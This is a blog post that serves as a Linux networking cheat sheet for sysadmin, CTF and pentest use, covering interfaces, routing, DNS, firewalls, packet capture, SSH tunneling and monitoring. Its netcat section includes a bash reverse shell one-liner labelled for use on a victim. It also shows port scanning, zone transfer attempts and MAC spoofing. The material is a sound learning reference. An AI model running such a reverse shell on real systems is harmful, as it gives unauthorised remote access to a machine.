---
layout: post
title: "Linux Networking — Full Reference"
date: 2026-05-24 10:00:00 +0800
categories:
  - General Notes
tags:
  - Linux
  - Networking
  - Reference
  - Security
author: muhammed
description: A full Linux networking reference covering interfaces, routing, DNS, firewalls, traffic capture, tunneling, and monitoring. Built for quick lookup during CTFs, pentests, and day-to-day sysadmin work.
toc: true
pin: false
math: false
mermaid: false
---

## Network Interfaces

### View Interfaces

```bash
ip link show                      # list all interfaces
ip addr show                      # list interfaces with IPs
ip addr show eth0                 # specific interface
ifconfig                          # legacy — shows active interfaces
ifconfig -a                       # all including down interfaces
```

### Bring Up / Down

```bash
ip link set eth0 up
ip link set eth0 down
ifconfig eth0 up
ifconfig eth0 down
```

### Assign / Remove IP

```bash
ip addr add 192.168.1.10/24 dev eth0
ip addr del 192.168.1.10/24 dev eth0
ifconfig eth0 192.168.1.10 netmask 255.255.255.0
```

### Rename Interface

```bash
ip link set eth0 name wan0
```

### MAC Address

```bash
ip link show eth0                 # see current MAC
ip link set eth0 address aa:bb:cc:dd:ee:ff   # spoof MAC (interface must be down)
```

---

## Routing

### View Routes

```bash
ip route show                     # routing table
ip route show table all           # all routing tables
route -n                          # legacy, numeric
netstat -rn                       # legacy
```

### Add / Delete Routes

```bash
ip route add 10.0.0.0/8 via 192.168.1.1
ip route add default via 192.168.1.1          # default gateway
ip route del 10.0.0.0/8
ip route replace default via 192.168.1.254    # replace gateway
```

### Policy Routing

```bash
ip rule show                      # routing rules
ip rule add from 10.0.0.0/8 table 100
ip route add default via 10.0.0.1 table 100
```

---

## DNS Tools

### dig

```bash
dig example.com                   # A record
dig example.com MX                # MX record
dig example.com ANY               # all records
dig @8.8.8.8 example.com         # query specific server
dig -x 1.2.3.4                   # reverse lookup
dig example.com +short            # IP only
dig example.com +trace            # full resolution path
dig axfr example.com @ns1.example.com   # zone transfer attempt
```

### nslookup / host

```bash
nslookup example.com
nslookup example.com 8.8.8.8
host example.com
host -t MX example.com
host 1.2.3.4                      # reverse lookup
```

### /etc/resolv.conf

```bash
cat /etc/resolv.conf              # current DNS servers
nameserver 8.8.8.8
nameserver 1.1.1.1
search example.com                # appended to unqualified names
```

### /etc/hosts

```bash
cat /etc/hosts
echo "192.168.1.10 internal.lab" >> /etc/hosts   # static override
```

---

## Connectivity Testing

### ping

```bash
ping 8.8.8.8                      # ICMP echo, runs forever
ping -c 4 8.8.8.8                 # 4 packets only
ping -i 0.2 8.8.8.8              # 0.2s interval
ping -s 1400 8.8.8.8             # custom packet size
ping6 ::1                         # IPv6 ping
```

### traceroute / tracepath

```bash
traceroute 8.8.8.8               # UDP by default
traceroute -T 8.8.8.8           # TCP mode (bypass firewalls)
traceroute -I 8.8.8.8           # ICMP mode
traceroute -p 443 8.8.8.8       # specific port
tracepath 8.8.8.8               # no root needed
```

### mtr

```bash
mtr 8.8.8.8                      # live traceroute + ping combined
mtr --report 8.8.8.8             # run once and output report
mtr -n 8.8.8.8                   # no DNS resolution
```

### curl / wget

```bash
curl -I https://example.com       # HTTP headers only
curl -v https://example.com       # verbose including TLS handshake
curl -o /dev/null -w "%{http_code}" https://example.com   # just status code
curl --resolve example.com:443:1.2.3.4 https://example.com  # override DNS
wget -q -O- https://example.com   # fetch to stdout
```

---

## Open Ports & Connections

### ss (modern replacement for netstat)

```bash
ss -tuln                          # TCP+UDP listening, numeric
ss -tulnp                         # include process names (root)
ss -t state established           # established TCP connections
ss -s                             # summary stats
ss -o state TIME-WAIT             # all TIME-WAIT sockets
ss dst 10.0.0.1                  # connections to specific host
ss sport = :80                    # connections on source port 80
```

### netstat (legacy)

```bash
netstat -tuln                     # listening ports
netstat -tulnp                    # with process names
netstat -an                       # all connections numeric
netstat -s                        # protocol statistics
netstat -rn                       # routing table
```

### lsof

```bash
lsof -i                           # all network connections
lsof -i :80                       # processes using port 80
lsof -i TCP:443                   # TCP port 443
lsof -i -n -P                     # no DNS/port resolution
lsof -p 1234 -i                   # network files for PID 1234
```

### fuser

```bash
fuser 80/tcp                      # PID using TCP port 80
fuser -k 80/tcp                   # kill process on port 80
```

---

## Packet Capture

### tcpdump

```bash
tcpdump -i eth0                   # capture on eth0
tcpdump -i any                    # all interfaces
tcpdump -n                        # no DNS resolution
tcpdump -nn                       # no DNS or port name resolution
tcpdump -v / -vv / -vvv          # verbosity levels
tcpdump -c 100                    # stop after 100 packets
tcpdump -w capture.pcap           # write to file
tcpdump -r capture.pcap           # read from file

# Filters
tcpdump host 10.0.0.1
tcpdump src host 10.0.0.1
tcpdump dst port 443
tcpdump port 80 or port 443
tcpdump 'tcp flags & (tcp-syn) != 0'   # SYN packets only
tcpdump not port 22                     # exclude SSH
tcpdump -i eth0 -nn -w out.pcap 'port 80'
```

### tshark (CLI Wireshark)

```bash
tshark -i eth0                    # live capture
tshark -r capture.pcap            # read file
tshark -Y "http.request"          # display filter
tshark -T fields -e ip.src -e tcp.dstport   # extract fields
tshark -z io,stat,1               # traffic stats per second
```

---

## Firewall — iptables

### View Rules

```bash
iptables -L -n -v                 # all chains, numeric, verbose
iptables -L INPUT -n --line-numbers   # INPUT chain with line numbers
iptables -t nat -L -n -v          # NAT table
iptables -S                       # show as commands
```

### Common Rules

```bash
# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow specific port
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Drop everything else
iptables -A INPUT -j DROP

# Allow from specific IP
iptables -A INPUT -s 10.0.0.5 -j ACCEPT

# Block IP
iptables -A INPUT -s 1.2.3.4 -j DROP

# Delete rule by line number
iptables -D INPUT 3

# Flush all rules
iptables -F
```

### NAT / Forwarding

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Masquerade (NAT)
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Port forward
iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 80

# DNAT (forward to different host)
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.5:80
```

### Save / Restore

```bash
iptables-save > /etc/iptables/rules.v4
iptables-restore < /etc/iptables/rules.v4
```

---

## Firewall — ufw (Ubuntu)

```bash
ufw status verbose
ufw enable / ufw disable
ufw allow 22/tcp
ufw allow from 10.0.0.0/8
ufw deny 23
ufw delete allow 22/tcp
ufw reset
ufw logging on
```

---

## SSH Tunneling & Port Forwarding

### Local Port Forward

```bash
# Access remote service locally
ssh -L 8080:internal.host:80 user@jump.host
# → localhost:8080 forwards to internal.host:80 through jump.host
```

### Remote Port Forward

```bash
# Expose local port on remote server
ssh -R 9090:localhost:3000 user@remote.host
# → remote.host:9090 forwards back to your localhost:3000
```

### Dynamic (SOCKS Proxy)

```bash
ssh -D 1080 user@remote.host
# → sets up SOCKS5 proxy on localhost:1080
# Use with: curl --socks5 localhost:1080 http://target
```

### Jump Host

```bash
ssh -J user@jump.host user@target.host
# ProxyJump in ~/.ssh/config:
# Host target
#   ProxyJump jump.host
```

### Persistent Tunnel (no shell)

```bash
ssh -fNL 8080:localhost:80 user@remote.host
# -f = background, -N = no command, -L = local forward
```

---

## Netcat (nc)

```bash
# Connect to port
nc 10.0.0.1 80

# Listen on port
nc -lvnp 4444

# Send file
nc -lvnp 4444 > received.txt          # receiver
nc 10.0.0.1 4444 < file.txt           # sender

# Port scan
nc -zv 10.0.0.1 20-1024

# UDP mode
nc -u 10.0.0.1 53

# Reverse shell (on attacker)
nc -lvnp 4444
# On victim:
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

---

## ARP

```bash
arp -n                            # ARP cache, numeric
ip neigh show                     # modern equivalent
ip neigh flush dev eth0           # clear ARP cache for interface
arping -I eth0 192.168.1.1       # ARP ping
arp-scan -l                       # scan local network (root)
```

---

## Network Namespaces

```bash
ip netns list                     # list namespaces
ip netns add testns               # create namespace
ip netns exec testns ip addr      # run command in namespace
ip netns exec testns bash         # shell in namespace
ip netns delete testns

# Move interface to namespace
ip link set veth0 netns testns

# Create veth pair
ip link add veth0 type veth peer name veth1
```

---

## Bandwidth & Monitoring

### iftop

```bash
iftop -i eth0                     # live bandwidth per connection
iftop -n                          # no DNS
iftop -P                          # show ports
```

### nethogs

```bash
nethogs eth0                      # bandwidth per process
nethogs -d 2                      # refresh every 2 seconds
```

### iperf3 (throughput testing)

```bash
# Server side
iperf3 -s

# Client side
iperf3 -c 192.168.1.1            # TCP test
iperf3 -c 192.168.1.1 -u        # UDP test
iperf3 -c 192.168.1.1 -t 30     # run for 30 seconds
iperf3 -c 192.168.1.1 -P 4      # 4 parallel streams
```

### nload / vnstat

```bash
nload eth0                        # live bandwidth graph
vnstat -i eth0                    # historical usage stats
vnstat -h                         # hourly stats
vnstat -d                         # daily stats
```

---

## /proc Networking Entries

```bash
cat /proc/net/tcp                 # TCP connections (hex)
cat /proc/net/udp                 # UDP sockets
cat /proc/net/arp                 # ARP table
cat /proc/net/route               # routing table (hex)
cat /proc/net/dev                 # interface stats (bytes, packets)
cat /proc/net/if_inet6            # IPv6 interfaces
cat /proc/sys/net/ipv4/ip_forward # IP forwarding (0 or 1)
cat /proc/sys/net/ipv4/conf/all/rp_filter  # reverse path filter
```

---

## Wireless

```bash
iwconfig                          # show wireless interfaces
iwlist wlan0 scan                 # scan for networks
iw dev wlan0 scan                 # modern scanner
iw dev wlan0 link                 # current connection info
iw dev wlan0 set type monitor     # set monitor mode
airmon-ng start wlan0             # enable monitor mode (aircrack-ng)
```

---

## Key Files Reference

| File | Purpose |
|------|---------|
| `/etc/hosts` | Static hostname → IP mappings |
| `/etc/resolv.conf` | DNS server config |
| `/etc/network/interfaces` | Debian interface config |
| `/etc/netplan/*.yaml` | Ubuntu 18+ interface config |
| `/etc/sysconfig/network-scripts/` | RHEL/CentOS interface config |
| `/etc/hostname` | System hostname |
| `/etc/nsswitch.conf` | Name resolution order |
| `/proc/net/tcp` | Current TCP connections |
| `/proc/sys/net/ipv4/ip_forward` | IP forwarding toggle |

---

## Quick Security Checks

```bash
# Find listening services
ss -tulnp

# Check for unexpected outbound connections
ss -tnp state established

# Who is connected via SSH
w
who
last

# Trace what a process is connecting to
strace -e trace=network -p <PID>

# Check ARP cache for poisoning signs
ip neigh show

# Dump all active connections with process
lsof -i -n -P

# Check iptables for unexpected rules
iptables -L -n -v
iptables -t nat -L -n -v
```

---

## You can find me online at:

![My signature image](/assets/img/footer-signature.png)

- **X (Twitter):** [Md3omer](https://x.com/Md3omer)
- **GitHub:** [Mhdomer](https://github.com/Mhdomer)
- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/)
- **Tryhackme:** [nonlouy](https://tryhackme.com/p/nonlouy)
